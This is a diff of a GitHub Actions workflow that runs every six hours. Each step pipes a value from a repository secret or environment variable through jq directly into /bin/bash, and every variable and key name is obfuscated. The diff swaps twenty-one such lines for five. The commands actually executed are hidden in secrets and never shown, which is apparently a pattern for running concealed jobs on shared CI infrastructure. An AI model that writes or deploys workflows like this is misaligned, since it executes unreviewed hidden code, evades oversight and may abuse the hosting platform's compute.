@@ -2,37 +2,20 @@ name: gaoyaguo2603
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
+    - cron: '39 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaoyaguo2603
         env:
-          z7: ${{ secrets.z7 }}
+          q02294: ${{ secrets.q02294 }}
         run: |
-          echo $z7 | jq -r .ticj88194 | /bin/bash
-          echo $l520 | jq -r .vcw08 | /bin/bash
-          echo $u16630 | jq -r .kjm643 | /bin/bash
-          echo $y716 | jq -r .vr8727 | /bin/bash
-          echo $t0 | jq -r .yk5553 | /bin/bash
-          echo $pyo5592 | jq -r .gl3472 | /bin/bash
-          echo $qea689 | jq -r .sxq50311 | /bin/bash
-          echo $o2610 | jq -r .njtpp7 | /bin/bash
-          echo $mrb38 | jq -r .fr3150 | /bin/bash
-          echo $gxk59611 | jq -r .ir569 | /bin/bash
-          echo $rhkhr15 | jq -r .klea97597 | /bin/bash
-          echo $rt4231 | jq -r .xfiox743 | /bin/bash
-          echo $bk38208 | jq -r .bubo7025 | /bin/bash
-          echo $qhgcy15181 | jq -r .y0974 | /bin/bash
-          echo $ytx2172 | jq -r .m23696 | /bin/bash
-          echo $hq53 | jq -r .uon39 | /bin/bash
-          echo $vzr3 | jq -r .zzrf7212 | /bin/bash
-          echo $l4264 | jq -r .vqhp5 | /bin/bash
-          echo $pk1862 | jq -r .uk55260 | /bin/bash
-          echo $xjpg34 | jq -r .d6 | /bin/bash
-          echo $k56641 | jq -r .h556 | /bin/bash
+          echo $q02294 | jq -r .wttpk1611 | /bin/bash
+          echo $mh55393 | jq -r .ri79 | /bin/bash
+          echo $tkcs749 | jq -r .mvosy649 | /bin/bash
+          echo $atu46358 | jq -r .bz229 | /bin/bash
+          echo $al29009 | jq -r .u0743 | /bin/bash
 
